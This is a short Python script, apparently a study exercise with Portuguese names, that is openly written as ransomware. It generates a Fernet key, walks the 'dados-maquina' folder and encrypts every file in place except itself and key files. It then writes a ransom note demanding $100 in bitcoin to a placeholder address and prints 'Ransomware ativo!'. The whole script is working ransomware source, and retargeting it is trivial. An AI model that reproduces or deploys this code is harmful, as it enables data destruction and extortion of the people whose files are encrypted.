from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivo in os.walk(diretorio):
        for nome in arquivo:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("MELHOR-LER-ISSO.txt", "w") as f:
        f.write("Seus arquivos foram encriptados, mas adorariamos devolve-los a voce!\n")
        f.write("Envie $100 (dolares) em bitcoin para XXXXXXX e o comprovante identificando a si mesmo!\n")
        f.write("Depois disso, liberaremos seu sistema lhe cedendo a chave!\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("dados-maquina")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware ativo!")

if __name__=="__main__":
    main()
